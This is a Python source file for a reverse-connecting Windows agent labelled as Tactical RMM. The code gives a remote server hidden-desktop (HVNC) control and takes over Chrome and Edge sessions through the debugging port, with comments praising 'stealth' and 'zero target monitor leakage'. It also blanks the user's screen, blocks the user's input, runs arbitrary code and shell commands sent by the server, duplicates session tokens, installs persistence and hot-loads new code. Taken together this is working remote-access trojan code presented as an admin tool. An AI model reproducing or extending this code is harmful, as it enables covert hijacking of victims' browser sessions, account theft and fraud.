"""
Tactical RMM — Reverse Connecting Agent Client.
Establishes outbound WebSocket connection to Master Hub and serves HVNC remote control.
"""

import sys
import os
import time
import json
import socket
import getpass
import platform
import asyncio
import logging
import threading
from typing import Dict, Any, Optional
import websockets
try:
    from websockets.exceptions import ConnectionClosed
except Exception:
    try:
        ConnectionClosed = websockets.ConnectionClosed
    except Exception:
        ConnectionClosed = Exception
import subprocess

try:
    import psutil
except ImportError:
    psutil = None

import ctypes
from ctypes import wintypes

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.c_char_p),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

CREATE_NO_WINDOW = 0x08000000 if sys.platform == "win32" else 0

def get_silent_startupinfo():
    if sys.platform == "win32":
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0  # SW_HIDE
        return si
    return None

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from hvnc.desktop import HiddenDesktop
from hvnc.spawner import AppSpawner
from hvnc.compositor import WindowCompositor
from hvnc.input_handler import InputHandler
from hvnc.mirror import MirrorCapture, MirrorInput, ScreenCurtain
from hvnc.cdp_controller import CDPController
from .provisioner import AgentProvisioner
log_file_path = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "trmm_agent.log")
handlers = [logging.FileHandler(log_file_path, encoding="utf-8", mode="a")]
if sys.stdout is not None:
    handlers.append(logging.StreamHandler(sys.stdout))

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=handlers
)
logger = logging.getLogger("agent.client")

def get_current_session_id() -> int:
    try:
        sid = wintypes.DWORD()
        if ctypes.windll.kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sid)):
            return sid.value
    except Exception:
        pass
    return 0

def get_active_console_session_id() -> int:
    try:
        return ctypes.windll.kernel32.WTSGetActiveConsoleSessionId()
    except Exception:
        return 0

def is_agent_running_in_session(session_id: int) -> bool:
    try:
        current_pid = os.getpid()
        if psutil:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    name = proc.info.get('name')
                    if name and ('trmm_agent' in name.lower() or 'python' in name.lower()):
                        if proc.info['pid'] != current_pid:
                            proc_sid = wintypes.DWORD()
                            if ctypes.windll.kernel32.ProcessIdToSessionId(proc.info['pid'], ctypes.byref(proc_sid)):
                                if proc_sid.value == session_id:
                                    return True
                except Exception:
                    pass
    except Exception:
        pass
    return False

def terminate_same_session_instances():
    """Terminates other TRMM_Agent processes running in the SAME Windows session."""
    try:
        current_pid = os.getpid()
        my_sid = get_current_session_id()
        if psutil:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    pexe = (proc.info.get('exe') or "").lower()
                    my_exe = (sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])).lower()
                    if pexe and pexe == my_exe and proc.info['pid'] != current_pid:
                        proc_sid = wintypes.DWORD()
                        if ctypes.windll.kernel32.ProcessIdToSessionId(proc.info['pid'], ctypes.byref(proc_sid)):
                            if proc_sid.value == my_sid:
                                logger.info(f"Terminating older instance of same executable in session {my_sid} (PID {proc.info['pid']})")
                                proc.kill()
                except Exception:
                    pass
    except Exception as e:
        logger.debug(f"Instance termination note: {e}")

def launch_agent_in_session(session_id: int, exe_path: str = None) -> bool:
    """Spawns TRMM_Agent into target interactive session using Task Scheduler, WTSQueryUserToken, or Explorer token duplication."""
    if not exe_path:
        exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])

    logger.info(f"[Session Launcher] Attempting to launch agent into Session {session_id} -> {exe_path}")

    # Method 1: WTSQueryUserToken + CreateProcessAsUserW
    try:
        wtsapi32 = ctypes.windll.wtsapi32
        advapi32 = ctypes.windll.advapi32
        userenv = ctypes.windll.userenv
        kernel32 = ctypes.windll.kernel32

        wtsapi32.WTSQueryUserToken.argtypes = [wintypes.ULONG, ctypes.POINTER(wintypes.HANDLE)]
        wtsapi32.WTSQueryUserToken.restype = wintypes.BOOL

        advapi32.DuplicateTokenEx.argtypes = [
            wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID,
            ctypes.c_int, ctypes.c_int, ctypes.POINTER(wintypes.HANDLE)
        ]
        advapi32.DuplicateTokenEx.restype = wintypes.BOOL

        userenv.CreateEnvironmentBlock.argtypes = [ctypes.POINTER(wintypes.LPVOID), wintypes.HANDLE, wintypes.BOOL]
        userenv.CreateEnvironmentBlock.restype = wintypes.BOOL

        userenv.DestroyEnvironmentBlock.argtypes = [wintypes.LPVOID]
        userenv.DestroyEnvironmentBlock.restype = wintypes.BOOL

        advapi32.CreateProcessAsUserW.argtypes = [
            wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPWSTR,
            wintypes.LPVOID, wintypes.LPVOID, wintypes.BOOL,
            wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
            ctypes.POINTER(STARTUPINFOW), ctypes.POINTER(PROCESS_INFORMATION)
        ]
        advapi32.CreateProcessAsUserW.restype = wintypes.BOOL

        h_user_token = wintypes.HANDLE()
        if wtsapi32.WTSQueryUserToken(session_id, ctypes.byref(h_user_token)):
            h_dup_token = wintypes.HANDLE()
            if advapi32.DuplicateTokenEx(
                h_user_token, 0x10000000, None, 2, 1, ctypes.byref(h_dup_token)
            ):
                p_env = wintypes.LPVOID()
                userenv.CreateEnvironmentBlock(ctypes.byref(p_env), h_dup_token, False)

                si = STARTUPINFOW()
                si.cb = ctypes.sizeof(STARTUPINFOW)
                si.lpDesktop = "winsta0\\default"
                si.dwFlags = 0x00000001
                si.wShowWindow = 0

                pi = PROCESS_INFORMATION()
                cmd = f'"{exe_path}"'
                cmd_buf = ctypes.create_unicode_buffer(cmd)

                flags = 0x08000000 | 0x00000400
                ok = advapi32.CreateProcessAsUserW(
                    h_dup_token, None, cmd_buf, None, None, False,
                    flags, p_env, os.path.dirname(exe_path),
                    ctypes.byref(si), ctypes.byref(pi)
                )
                if p_env:
                    userenv.DestroyEnvironmentBlock(p_env)
                kernel32.CloseHandle(h_dup_token)
                kernel32.CloseHandle(h_user_token)

                if ok:
                    kernel32.CloseHandle(pi.hProcess)
                    kernel32.CloseHandle(pi.hThread)
                    logger.info(f"[Session Launcher] CreateProcessAsUserW launched agent in Session {session_id} (PID {pi.dwProcessId})")
                    return True
            else:
                kernel32.CloseHandle(h_user_token)
    except Exception as ex:
        logger.warning(f"[Session Launcher] CreateProcessAsUserW note: {ex}")

    # Method 3: Explorer.exe token duplication
    try:
        if psutil:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info.get('name', '').lower() == 'explorer.exe':
                        sid = wintypes.DWORD()
                        if ctypes.windll.kernel32.ProcessIdToSessionId(proc.info['pid'], ctypes.byref(sid)):
                            if sid.value == session_id:
                                h_proc = ctypes.windll.kernel32.OpenProcess(0x1000, False, proc.info['pid'])
                                if h_proc:
                                    h_tok = wintypes.HANDLE()
                                    if ctypes.windll.advapi32.OpenProcessToken(h_proc, 0x0002 | 0x0004 | 0x0008, ctypes.byref(h_tok)):
                                        h_dup = wintypes.HANDLE()
                                        if ctypes.windll.advapi32.DuplicateTokenEx(h_tok, 0x10000000, None, 2, 1, ctypes.byref(h_dup)):
                                            si = STARTUPINFOW()
                                            si.cb = ctypes.sizeof(STARTUPINFOW)
                                            si.lpDesktop = "winsta0\\default"
                                            si.dwFlags = 0x00000001
                                            si.wShowWindow = 0
                                            pi = PROCESS_INFORMATION()
                                            cmd_buf = ctypes.create_unicode_buffer(f'"{exe_path}"')
                                            ok = ctypes.windll.advapi32.CreateProcessAsUserW(
                                                h_dup, None, cmd_buf, None, None, False,
                                                0x08000000 | 0x00000400, None, os.path.dirname(exe_path),
                                                ctypes.byref(si), ctypes.byref(pi)
                                            )
                                            ctypes.windll.kernel32.CloseHandle(h_dup)
                                            if ok:
                                                ctypes.windll.kernel32.CloseHandle(pi.hProcess)
                                                ctypes.windll.kernel32.CloseHandle(pi.hThread)
                                                ctypes.windll.kernel32.CloseHandle(h_tok)
                                                ctypes.windll.kernel32.CloseHandle(h_proc)
                                                logger.info(f"[Session Launcher] Explorer token dup launched agent in Session {session_id} (PID {pi.dwProcessId})")
                                                return True
                                        ctypes.windll.kernel32.CloseHandle(h_tok)
                                    ctypes.windll.kernel32.CloseHandle(h_proc)
                except Exception:
                    pass
    except Exception as ex:
        logger.warning(f"[Session Launcher] Explorer token duplication note: {ex}")

    return False


class AgentClient:
    """Outbound reverse-connecting agent."""

    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.agent_id = config.get("agent_id", "agent_default")
        self.server_url = config.get("server_url", "ws://127.0.0.1:8000")
        self.reconnect_interval = config.get("reconnect_interval_sec", 5)
        self.heartbeat_interval = config.get("heartbeat_interval_sec", 10)

        # Ensure DPI awareness
        try:
            import ctypes
            try:
                ctypes.windll.shcore.SetProcessDpiAwareness(2)
            except Exception:
                ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass

        # Initialize HVNC components (Backstage mode)
        desktop_name = f"TRMM_HVNC_{self.agent_id}"
        self.desktop = HiddenDesktop(desktop_name)
        self.spawner = AppSpawner(desktop_name)
        self.compositor = WindowCompositor(self.desktop)
        self.input_handler = InputHandler(self.desktop, compositor=self.compositor, spawner_callback=self._launch_app)
        self.desktop_initialized = False
        self.is_streaming = False
        self.is_stream_paused = False
        self.target_fps = 30
        self.last_input_time = time.time()
        self._running = True

        # Mirror capture (Take Control mode — real desktop)
        self.mirror_capture = MirrorCapture()
        self.is_mirroring = False

        # CDP Controllers (Chrome DevTools Protocol for Chrome & Edge)
        self.cdp_chrome = CDPController(port=9222)
        self.cdp_edge = CDPController(port=9223)
        self.cdp_active_controller: Optional[CDPController] = None
        self.cdp_stream_task: Optional[asyncio.Task] = None
        self.is_cdp_streaming = False

        # Independent stream task handles
        self.hvnc_stream_task: Optional[asyncio.Task] = None
        self.mirror_stream_task: Optional[asyncio.Task] = None
        self._persistence_verified = False

    def _terminate_agent(self, reason: str = "Terminated", uninstall: bool = False):
        """Cleanly terminates the agent process, removes shortcuts and service if decommissioning."""
        logger.info(f"Terminating agent: {reason} (uninstall={uninstall})")
        self._running = False
        try:
            if self.desktop:
                self.desktop.cleanup()
        except Exception:
            pass

        if uninstall:
            try:
                import glob
                # Remove startup shortcuts from ProgramData and AppData
                for p in [
                    r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent*.lnk",
                    os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TRMM_Agent*.lnk")
                ]:
                    for f in glob.glob(p):
                        try:
                            os.remove(f)
                        except Exception:
                            pass
            except Exception:
                pass

            # Remove scheduled tasks
            try:
                subprocess.run(
                    ["schtasks", "/Delete", "/TN", "TRMM_Agent_Persist", "/F"],
                    capture_output=True, timeout=5, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW
                )
                subprocess.run(
                    ["schtasks", "/Delete", "/TN", "TRMM_Agent_User", "/F"],
                    capture_output=True, timeout=5, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW
                )
                logger.info("[Uninstall] Persistence scheduled tasks removed.")
            except Exception:
                pass

            # Remove registry autorun
            try:
                subprocess.run(["reg", "delete", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "/v", "TRMM_Agent", "/f"], capture_output=True, timeout=5, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)
            except Exception:
                pass

            # Stop and delete legacy Windows Service if it was ever installed
            try:
                subprocess.run(["sc.exe", "stop", "TRMM_Agent"], capture_output=True, timeout=5, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)
                subprocess.run(["sc.exe", "delete", "TRMM_Agent"], capture_output=True, timeout=5, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)
            except Exception:
                pass

        # Terminate only stale processes in THIS SAME session to avoid killing worker/supervisor
        try:
            terminate_same_session_instances()
        except Exception:
            pass

        logger.info("Agent process exiting cleanly.")
        os._exit(0)

    def get_system_telemetry(self) -> Dict[str, Any]:
        """Collects endpoint specs and telemetry."""
        hostname = socket.gethostname()
        local_ip = "127.0.0.1"
        try:
            local_ip = socket.gethostbyname(hostname)
        except Exception:
            pass

        ram_gb = 0.0
        if psutil:
            ram_gb = round(psutil.virtual_memory().total / (1024**3), 1)

        my_sid = get_current_session_id()
        active_sid = get_active_console_session_id()

        return {
            "agent_id": self.agent_id,
            "endpoint_tag": self.config.get("endpoint_tag", f"Agent-{self.agent_id}"),
            "hostname": hostname,
            "username": getpass.getuser(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "ram_gb": ram_gb,
            "cpu": platform.processor() or "x86/x64 Processor",
            "local_ip": local_ip,
            "session_id": my_sid,
            "active_session": active_sid,
            "is_supervisor": (my_sid == 0),
            "code_hash": AgentProvisioner.get_local_code_hash(),
        }

    def ensure_desktop(self):
        if not self.desktop_initialized:
            self.desktop.initialize()
            self.desktop_initialized = True

    async def connect_and_serve(self):
        """Connects outbound to the Master Hub."""
        clean_url = self.server_url.rstrip("/").replace("http://", "ws://").replace("https://", "wss://")
        while clean_url.endswith("/ws"):
            clean_url = clean_url[:-3].rstrip("/")
        ws_endpoint = f"{clean_url}/ws/agent/{self.agent_id}"
        logger.info(f"Dialing Master Hub at: {ws_endpoint}")

        self.ensure_desktop()

        try:
            async with websockets.connect(ws_endpoint, max_size=10 * 1024 * 1024) as ws:
                logger.info("Connected to Master Hub successfully.")

                # Send registration handshake
                telemetry = self.get_system_telemetry()
                await ws.send(json.dumps({"type": "handshake", "data": telemetry}))

                # Start background tasks
                asyncio.create_task(self._heartbeat_loop(ws))

                try:
                    async for message in ws:
                        try:
                            if isinstance(message, str):
                                msg = json.loads(message)
                                mtype = msg.get("type")

                                if mtype == "start_hvnc":
                                    logger.info("Received request to start HVNC session (Backstage).")
                                    self.is_streaming = True
                                    if self.input_handler:
                                        self.input_handler.reset_state()
                                    if self.hvnc_stream_task and not self.hvnc_stream_task.done():
                                        self.hvnc_stream_task.cancel()
                                    self.hvnc_stream_task = asyncio.create_task(self._stream_loop(ws))

                                elif mtype == "stop_hvnc":
                                    logger.info("Stopping HVNC session.")
                                    self.is_streaming = False
                                    if self.input_handler:
                                        self.input_handler.reset_state()
                                    if self.hvnc_stream_task and not self.hvnc_stream_task.done():
                                        self.hvnc_stream_task.cancel()

                                elif mtype == "start_mirror":
                                    logger.info("Received request to start Screen Mirror (Take Control) session.")
                                    from agent_client.mirror_transport import MirrorUplink
                                    protocol = msg.get("transport", 0)
                                    preview = bool(msg.get("preview", False))
                                    if (self.is_mirroring and self.mirror_stream_task and not self.mirror_stream_task.done()
                                            and protocol == getattr(self, "mirror_protocol", 0)):
                                        if protocol == 2:
                                            self.mirror_flow.preview = preview
                                            self.mirror_flow.refresh()
                                        continue
                                    self.mirror_protocol = protocol
                                    if protocol == 2:
                                        self.mirror_flow = MirrorUplink(self, ws, preview)
                                    self.is_mirroring = True
                                    MirrorInput.cleanup()
                                    if self.mirror_stream_task and not self.mirror_stream_task.done():
                                        self.mirror_stream_task.cancel()
                                    self.mirror_stream_task = asyncio.create_task(self._mirror_stream_loop(ws))

                                elif mtype == "mirror_frame_ack":
                                    if getattr(self, "mirror_protocol", 0) == 2:
                                        self.mirror_flow.acknowledge(msg)
                                elif mtype == "mirror_feedback":
                                    if getattr(self, "mirror_protocol", 0) == 2:
                                        self.mirror_flow.feedback(msg.get("delivery_ms"))
                                elif mtype == "mirror_refresh":
                                    if getattr(self, "mirror_protocol", 0) == 2:
                                        self.mirror_flow.refresh()
                                elif mtype == "stop_mirror":
                                    logger.info("Stopping Screen Mirror session.")
                                    self.is_mirroring = False
                                    try:
                                        ScreenCurtain.cleanup()
                                        MirrorInput.cleanup()
                                    except Exception:
                                        pass
                                    if self.mirror_stream_task and not self.mirror_stream_task.done():
                                        self.mirror_stream_task.cancel()

                                elif mtype == "start_cdp":
                                    browser = msg.get("browser", "chrome").lower()
                                    tab_id = msg.get("tab_id")
                                    ctrl = self.cdp_edge if browser == "edge" else self.cdp_chrome
                                    logger.info(f"Received request to start CDP session for {browser} (port {ctrl.port})...")

                                    # Check port, and if offline, attempt seamless launch with debugging flag enabled
                                    if not ctrl.is_port_open():
                                        logger.info(f"Port {ctrl.port} is closed. Preparing auto-launch for {browser}...")
                                        await ws.send(json.dumps({
                                            "type": "cdp_status",
                                            "pending": True,
                                            "message": f"Attaching to {browser.title()} with session preservation... Please wait."
                                        }))
                                        loop = asyncio.get_running_loop()
                                        desk_name = self.desktop.desktop_name if self.desktop else None
                                        await loop.run_in_executor(None, lambda: ctrl.ensure_browser_listening(browser=browser, timeout=12.0, desktop_name=desk_name))

                                    if not ctrl.is_port_open():
                                        await ws.send(json.dumps({
                                            "type": "cdp_status",
                                            "success": False,
                                            "error": f"Browser port {ctrl.port} could not be opened. Check if {browser} is installed."
                                        }))
                                    else:
                                        ok = await ctrl.connect_to_tab(tab_id)
                                        if ok:
                                            self.cdp_active_controller = ctrl
                                            if self.desktop:
                                                # In Backstage mode, keep desktop streaming active so the viewer
                                                # displays the COMPLETE native browser window (tabs, address bar,
                                                # all 4 corners, caption controls) with 100% stealth and zero target monitor leakage!
                                                try:
                                                    wins = [w for w in self.desktop.enumerate_windows() if ("Chrome" in w[2] or "Edge" in w[2]) and w[1]]
                                                    if wins:
                                                        ctypes.windll.user32.ShowWindow(wins[0][0], 3) # SW_MAXIMIZE
                                                        ctypes.windll.user32.BringWindowToTop(wins[0][0])
                                                        ctypes.windll.user32.SetForegroundWindow(wins[0][0])
                                                except Exception:
                                                    pass

                                                self.is_streaming = True
                                                if not self.hvnc_stream_task or self.hvnc_stream_task.done():
                                                    self.hvnc_stream_task = asyncio.create_task(self._stream_loop(ws))
                                            else:
                                                # Mirror / Headless fallback mode
                                                self.is_cdp_streaming = True
                                                if self.cdp_stream_task and not self.cdp_stream_task.done():
                                                    self.cdp_stream_task.cancel()
                                                self.cdp_stream_task = asyncio.create_task(self._cdp_stream_loop(ws, ctrl))

                                            await ws.send(json.dumps({
                                                "type": "cdp_status",
                                                "success": True,
                                                "tab_id": ctrl.active_tab_id,
                                                "tabs": ctrl.list_tabs()
                                            }))
                                        else:
                                            await ws.send(json.dumps({
                                                "type": "cdp_status",
                                                "success": False,
                                                "error": "Failed to connect to browser tab via CDP WebSocket."
                                            }))

                                elif mtype == "stop_cdp":
                                    logger.info("Stopping CDP session.")
                                    self.is_cdp_streaming = False
                                    if self.cdp_stream_task and not self.cdp_stream_task.done():
                                        self.cdp_stream_task.cancel()
                                    if self.cdp_active_controller:
                                        await self.cdp_active_controller.close()
                                        self.cdp_active_controller = None
                                    # Resume Backstage desktop streaming
                                    self.is_streaming = True
                                    if not self.hvnc_stream_task or self.hvnc_stream_task.done():
                                        self.hvnc_stream_task = asyncio.create_task(self._stream_loop(ws))

                                elif mtype == "cdp_list_tabs":
                                    browser = msg.get("browser", "chrome").lower()
                                    ctrl = self.cdp_edge if browser == "edge" else self.cdp_chrome
                                    is_open = ctrl.is_port_open()
                                    tabs = ctrl.list_tabs() if is_open else []
                                    await ws.send(json.dumps({
                                        "type": "cdp_tabs",
                                        "browser": browser,
                                        "is_open": is_open,
                                        "tabs": tabs
                                    }))

                                elif mtype == "cdp_navigate":
                                    url = msg.get("url", "")
                                    if self.cdp_active_controller and url:
                                        await self.cdp_active_controller.navigate(url)

                                elif mtype == "terminate":
                                    reason = msg.get("reason", "Terminated by server")
                                    uninstall = msg.get("uninstall", False)
                                    self._terminate_agent(reason, uninstall=uninstall)

                                elif mtype == "get_installed_apps":
                                    apps = self.spawner.get_installed_apps() if self.spawner else []
                                    await ws.send(json.dumps({"type": "installed_apps", "apps": apps}))

                                elif mtype == "get_diag_status":
                                    windows = self.desktop.enumerate_windows(include_minimized=True) if self.desktop else []
                                    win_list = []
                                    for w in windows:
                                        w_info = {"hwnd": w[0], "title": w[1], "class": w[2], "rect": list(w[3]), "minimized": w[4] if len(w)>4 else False}
                                        # If Task Manager or File Explorer, enumerate visible children
                                        if "TaskManager" in w[2] or "CabinetWClass" in w[2]:
                                            ch_list = []
                                            def _c_cb(ch, lp):
                                                cr = wintypes.RECT()
                                                ctypes.windll.user32.GetWindowRect(ch, ctypes.byref(cr))
                                                c_name = ctypes.create_unicode_buffer(256)
                                                ctypes.windll.user32.GetClassNameW(ch, c_name, 256)
                                                vis = bool(ctypes.windll.user32.IsWindowVisible(ch))
                                                ch_list.append({"hwnd": ch, "class": c_name.value, "rect": [cr.left, cr.top, cr.right, cr.bottom], "vis": vis})
                                                return True
                                            ctypes.windll.user32.EnumChildWindows(w[0], ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)(_c_cb), 0)
                                            w_info["children"] = ch_list
                                        win_list.append(w_info)
                                    await ws.send(json.dumps({
                                        "type": "diag_status",
                                        "windows": win_list,
                                        "desktop_name": self.desktop.desktop_name if self.desktop else None,
                                        "streaming": self.is_streaming,
                                    }))

                                elif mtype == "eval_code":
                                    code = msg.get("code", "")
                                    try:
                                        loc = {"client": self, "desktop": self.desktop, "input_handler": self.input_handler, "compositor": self.compositor}
                                        exec(code, globals(), loc)
                                        res = loc.get("result", "ok")
                                        await ws.send(json.dumps({"type": "eval_result", "success": True, "result": str(res)}))
                                    except Exception as ex:
                                        await ws.send(json.dumps({"type": "eval_result", "success": False, "error": str(ex)}))

                                elif mtype == "exec_diag":
                                    c = msg.get("cmd")
                                    try:
                                        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
                                        await ws.send(json.dumps({
                                            "type": "diag_exec_result",
                                            "returncode": r.returncode,
                                            "stdout": r.stdout,
                                            "stderr": r.stderr
                                        }))
                                    except Exception as ex:
                                        await ws.send(json.dumps({
                                            "type": "diag_exec_result",
                                            "error": str(ex)
                                        }))

                                elif mtype == "launch":
                                    app_name = msg.get("app", "").lower()
                                    url = msg.get("url")
                                    diag = self._launch_app(app_name, url)
                                    try:
                                        await ws.send(json.dumps({"type": "diag_launch", **diag}))
                                    except Exception:
                                        pass

                                elif mtype == "launch_installed_app":
                                    app_cmd = msg.get("cmd", "")
                                    app_name = msg.get("name", "")
                                    pid, err, binary = None, "App spawner not initialized", None
                                    if self.spawner:
                                        pid, err, binary = self.spawner.launch_installed_app(app_cmd, app_name)
                                    try:
                                        await ws.send(json.dumps({
                                            "type": "diag_launch",
                                            "app": app_name or app_cmd,
                                            "success": bool(pid),
                                            "pid": pid,
                                            "error": err,
                                            "binary": binary,
                                        }))
                                    except Exception:
                                        pass

                                elif mtype == "taskbar_action":
                                    action = msg.get("action", "")
                                    hwnd = int(msg.get("hwnd", 0))
                                    if self.input_handler:
                                        self.input_handler.handle_taskbar_action(action, hwnd)

                                elif mtype == "set_curtain":
                                    enabled = bool(msg.get("enabled", False))
                                    ok = ScreenCurtain.set_curtain(enabled)
                                    MirrorInput.set_stealth_cursor(enabled)
                                    if not enabled:
                                        try:
                                            TouchpadLock.restore()
                                        except Exception:
                                            pass
                                    try:
                                        await ws.send(json.dumps({"type": "diag_curtain", "enabled": enabled, "success": ok}))
                                    except Exception:
                                        pass

                                elif mtype == "set_block_input":
                                    enabled = bool(msg.get("enabled", False))
                                    ok = ScreenCurtain.set_block_input(enabled)
                                    try:
                                        await ws.send(json.dumps({"type": "diag_block_input", "enabled": enabled, "success": ok}))
                                    except Exception:
                                        pass

                                elif mtype == "input":
                                    diag = self._handle_input(msg.get("data", {}))
                                    if diag:
                                        try:
                                            await ws.send(json.dumps(diag))
                                        except Exception:
                                            pass

                                elif mtype == "sync_code":
                                    logger.info("Executing OTA Live Code Sync...")
                                    old_hash = AgentProvisioner.get_local_code_hash()
                                    ok, reason = AgentProvisioner.sync_code_bundle(self.server_url)
                                    new_hash = AgentProvisioner.get_local_code_hash()
                                    has_update = (old_hash != new_hash)
                                    # Hot reload components
                                    if ok:
                                        try:
                                            updates_dir = AgentProvisioner.get_updates_dir()
                                            while updates_dir in sys.path:
                                                sys.path.remove(updates_dir)
                                            sys.path.insert(0, updates_dir)

                                            for mod in list(sys.modules.keys()):
                                                if mod.startswith("hvnc") or (mod.startswith("agent_client") and mod != "agent_client.client"):
                                                    del sys.modules[mod]

                                            import hvnc.desktop
                                            import hvnc.spawner
                                            import hvnc.compositor
                                            import hvnc.input_handler
                                            import hvnc.mirror

                                            self.spawner = hvnc.spawner.AppSpawner(f"TRMM_HVNC_{self.agent_id}")
                                            self.compositor = hvnc.compositor.WindowCompositor(self.desktop)
                                            self.input_handler = hvnc.input_handler.InputHandler(
                                                self.desktop, compositor=self.compositor, spawner_callback=self._launch_app
                                            )
                                            self.mirror_capture = hvnc.mirror.MirrorCapture()
                                            logger.info("HVNC modules dynamically reloaded in memory from updates.")
                                        except Exception as re_err:
                                            logger.warning(f"Note on module reload: {re_err}")

                                        try:
                                            self._ensure_persistence()
                                        except Exception as p_err:
                                            logger.warning(f"Persistence check on sync note: {p_err}")

                                    desc = ""
                                    try:
                                        m_path = os.path.join(AgentProvisioner.get_updates_dir(), "manifest.json")
                                        if os.path.isfile(m_path):
                                            with open(m_path, "r", encoding="utf-8") as mf:
                                                desc = json.load(mf).get("description", "")
                                    except Exception:
                                        pass

                                    await ws.send(json.dumps({
                                        "type": "diag_sync",
                                        "success": ok,
                                        "has_update": has_update,
                                        "description": desc or msg.get("description", "Latest code features applied."),
                                        "msg": reason,
                                        "code_hash": new_hash
                                    }))

                                    if ok and (has_update or msg.get("force_restart")):
                                        logger.info("New code applied via sync. Rebooting agent process cleanly...")
                                        try:
                                            subprocess.Popen(
                                                [sys.executable] + sys.argv[1:],
                                                close_fds=True,
                                                creationflags=CREATE_NO_WINDOW,
                                                startupinfo=get_silent_startupinfo()
                                            )
                                            asyncio.get_event_loop().call_later(0.6, lambda: os._exit(0))
                                        except Exception as ex:
                                            logger.error(f"Post-sync reboot error: {ex}")

                                elif mtype == "install_service":
                                    s_name = msg.get("name", "")
                                    s_disp = msg.get("display_name", s_name)
                                    s_bin = msg.get("bin_path", "")
                                    s_start = msg.get("start_type", "auto")
                                    ok, reason = AgentProvisioner.install_service(s_name, s_disp, s_bin, s_start)
                                    await ws.send(json.dumps({
                                        "type": "diag_provision",
                                        "action": "install_service",
                                        "target": s_name,
                                        "success": ok,
                                        "msg": reason
                                    }))

                                elif mtype == "install_package":
                                    p_url = msg.get("package_url", "")
                                    if p_url.startswith("/"):
                                        clean_srv = self.server_url.rstrip("/").replace("ws://", "http://").replace("wss://", "https://")
                                        p_url = f"{clean_srv}{p_url}"
                                    p_flags = msg.get("silent_flags")
                                    ok, reason = AgentProvisioner.install_package(p_url, p_flags)
                                    await ws.send(json.dumps({
                                        "type": "diag_provision",
                                        "action": "install_package",
                                        "target": p_url,
                                        "success": ok,
                                        "msg": reason
                                    }))

                                elif mtype == "restart_agent":
                                    logger.info("Restart agent requested. Spawning fresh process...")
                                    try:
                                        subprocess.Popen([sys.executable] + sys.argv[1:], close_fds=True, creationflags=CREATE_NO_WINDOW)
                                        os._exit(0)
                                    except Exception as ex:
                                        logger.error(f"Restart agent error: {ex}")

                                elif mtype == "exec_cmd":
                                    cmd = msg.get("cmd", "")
                                    logger.info(f"Executing diagnostic command: {cmd}")
                                    try:
                                        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)
                                        await ws.send(json.dumps({
                                            "type": "diag_exec_result",
                                            "stdout": res.stdout,
                                            "stderr": res.stderr,
                                            "code": res.returncode
                                        }))
                                    except Exception as ex:
                                        await ws.send(json.dumps({
                                            "type": "diag_exec_result",
                                            "stdout": "",
                                            "stderr": str(ex),
                                            "code": -1
                                        }))

                        except Exception as e:
                            logger.error(f"Error handling message: {e}")
                finally:
                    self.is_streaming = False
                    self.is_mirroring = False
                    try:
                        ScreenCurtain.cleanup()
                        MirrorInput.cleanup()
                    except Exception:
                        pass
                    if self.hvnc_stream_task and not self.hvnc_stream_task.done():
                        self.hvnc_stream_task.cancel()
                    if self.mirror_stream_task and not self.mirror_stream_task.done():
                        self.mirror_stream_task.cancel()
        except ConnectionClosed as e:
            reason_str = str(getattr(e, "reason", "")).lower()
            code = getattr(e, "code", 0)
            logger.info(f"WebSocket closed by server (code={code}, reason={reason_str})")
            if "superseded" in reason_str:
                my_sid = get_current_session_id()
                if my_sid == 0:
                    logger.info("[Session 0] Superseded by Session 1 interactive worker. Yielding connection and idling in supervisor mode.")
                    # Keep running watchdog loop while worker runs in active session
                    while getattr(self, "_running", True):
                        time.sleep(5)
